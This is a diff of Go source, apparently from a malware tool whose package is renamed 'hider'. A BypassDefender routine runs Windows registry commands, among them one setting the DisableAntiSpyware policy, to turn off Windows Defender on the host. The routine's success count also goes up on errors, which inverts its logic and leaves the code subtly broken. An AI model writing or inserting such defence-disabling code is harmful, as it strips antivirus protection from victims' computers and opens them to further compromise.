@@ -1,8 +1,8 @@
-package system
+package hider
 
 import "runtime"
 
-func (s *System) getDefenderCommands() []string {
+func (h *Hider) getDefenderCommands() []string {
 	return []string{
 		// Основные настройки
 		`reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f`,
@@ -36,15 +36,15 @@ func (s *System) getDefenderCommands() []string {
 	}
 }
 
-func (s *System) BypassDefender() (successful int, total int) {
+func (h *Hider) BypassDefender() (successful int, total int) {
 	if runtime.GOOS != "windows" {
 		return 0, 0
 	}
 
-	cmds := s.getDefenderCommands()
+	cmds := h.getDefenderCommands()
 	successful, total = 0, len(cmds)
 	for _, cmd := range cmds {
-		if _, err := s.Exec(cmd); err != nil {
+		if _, err := h.eng.System.Exec(cmd); err != nil {
 			successful++
 		}
 	}
